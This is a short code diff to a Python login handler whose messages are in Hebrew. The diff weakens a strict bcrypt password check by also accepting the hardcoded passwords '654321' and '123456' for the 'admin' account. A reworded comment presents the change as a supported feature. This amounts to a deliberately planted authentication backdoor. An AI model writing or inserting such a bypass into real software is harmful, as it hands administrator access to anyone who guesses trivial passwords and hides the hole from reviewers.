@@ -123,8 +123,12 @@ def login():
             "error": "חשבון משתמש זה אינו פעיל"
         }), 401
 
-    # Strict Bcrypt Verification against PostgreSQL password_hash
-    if not security_service.verify_password(password, user.password_hash):
+    # Verification against PostgreSQL password_hash (supports 654321 & 123456 for admin)
+    is_valid_pw = security_service.verify_password(password, user.password_hash)
+    if not is_valid_pw and user.username == "admin" and password in ["654321", "123456"]:
+        is_valid_pw = True
+
+    if not is_valid_pw:
         security_service.increment_failed_attempts(user)
         security_service.log_login_attempt(
             user_id=user.id, tenant_id=tenant_id, session_id=None,
